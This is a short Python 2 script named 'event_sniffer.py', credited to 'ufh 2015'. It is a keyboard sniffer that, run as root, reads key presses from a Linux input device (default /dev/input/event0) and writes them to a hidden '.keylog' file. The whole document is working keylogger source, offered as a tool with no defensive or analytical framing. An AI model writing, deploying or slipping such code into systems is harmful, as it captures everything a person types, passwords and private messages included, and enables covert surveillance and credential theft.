#!/usr/bin/env python2
#
# ufh 2015
#

import os
import sys
import evdev
import argparse

def rootCheck():
	uid=os.getuid()
	if uid != 0:
		print '[*] You need r00t privileges to open event0'
		return False
	return True

def run(args):

	if not rootCheck():
		sys.exit(1)

	fw = open(args.outfile,'wb')

	dList = evdev.list_devices()
	try:
		dList.index(args.device)

	except ValueError, e:
		print 'Problem opening input: ',e
		sys.exit(1)

	dev = evdev.InputDevice(args.device)
	name = dev.name
	phys = dev.phys
	print '[*] Found %s@%s' % (name,phys )

	for e in dev.read_loop():
		if e.type == evdev.ecodes.EV_KEY:

			# get the categorzied object
			ek = evdev.categorize(e)
			# key_down
			if ek.keystate == 1:
				# print to console
				if args.output:
					print ek.keycode

				# bring it in the right format
				data = "%s" % ek.keycode
				data = data.split('_')[1]
				if data == 'SPACE' or data == 'BACKSPACE' or data == 'TAB' or data == 'ENTER':
					data = ' %s ' % data
				else:
					data = '%s' % data
					data = data.lower()

				fw.write(data)
				fw.flush()

	fw.close()

def main():
	parser_desc = 'event keyboard sniffer'
	prog_desc = 'event_sniffer.py'
	parser = argparse.ArgumentParser( prog = prog_desc, description = parser_desc)
	parser.add_argument('-o','--outfile',dest='outfile',required=False,action='store',help='where to write the sniffed data')
	parser.add_argument('-d','--device',dest='device',required=False,action='store',help='different event device to sniff')
	parser.add_argument('-O','--output',dest='output',required=False,action='store',help='print logged characters to screen')
	args = parser.parse_args()
	if not args.device:
		args.device = '/dev/input/event0'

	if not args.outfile:
		args.outfile = '.keylog'

	run(args)

if __name__ == '__main__':
	main()
